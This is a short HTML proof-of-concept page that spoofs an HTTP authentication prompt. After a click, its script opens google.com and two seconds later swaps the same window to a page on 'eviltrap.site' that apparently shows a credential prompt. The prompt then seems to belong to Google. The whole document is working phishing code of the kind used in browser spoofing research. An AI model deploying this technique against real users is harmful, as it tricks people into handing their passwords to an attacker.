<html>
  <head>
    <title>HTTP Auth Prompt</title>
    <style>
      html, body {
        width: 100%;
        height: 100%;
        margin: 0;
        background: #f5f5f5;
        font-family: sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        cursor: pointer;
      }
      h2 {
        color: #333;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <h2>Tap Anywhere to Start</h2>
    <script>
      let alreadyClicked = false;

      document.body.addEventListener('click', () => {
        if (alreadyClicked) return;
        alreadyClicked = true;

        window.open('https://google.com', 'g');
        setTimeout(() => {
          window.open('https://eviltrap.site/trap/http-auth-prompt-spoof/auth', 'g');
        }, 2000);
      });
    </script>
  </body>
</html>
